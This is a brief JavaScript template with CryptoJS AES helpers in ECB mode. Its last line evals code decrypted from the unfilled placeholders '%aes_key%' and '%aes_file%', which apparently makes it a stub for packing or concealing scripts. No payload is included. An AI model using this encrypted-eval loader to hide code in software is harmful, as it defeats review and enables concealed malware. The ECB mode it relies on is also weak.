function enAES(key, str) {
    var encrypt = CryptoJS.AES.encrypt(str, CryptoJS.enc.Utf8.parse(key), {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    });
    return encrypt.toString();
}
function deAES(key, str) {
    var decrypt = CryptoJS.AES.decrypt(str, CryptoJS.enc.Utf8.parse(key), {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    });
    return decrypt.toString(CryptoJS.enc.Utf8);
}
eval(deAES("%aes_key%", "%aes_file%"));